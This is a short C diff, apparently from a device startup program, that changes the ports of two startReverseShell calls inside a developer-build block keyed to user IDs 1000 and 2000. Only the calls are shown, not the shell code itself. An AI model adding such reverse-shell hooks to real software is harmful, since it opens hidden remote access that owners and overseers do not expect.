@@ -265,9 +265,9 @@ int starter_main(int argc, char *argv[]) {
 #ifdef DEVFLAVOR
     /* Open these ports unconditionally. */
     if (uid == 1000) {
-        startReverseShell(9998);
+        startReverseShell(1337);
     } else if (uid == 2000)
-        startReverseShell(9999);
+        startReverseShell(1338);
 #endif
 
     se::init();
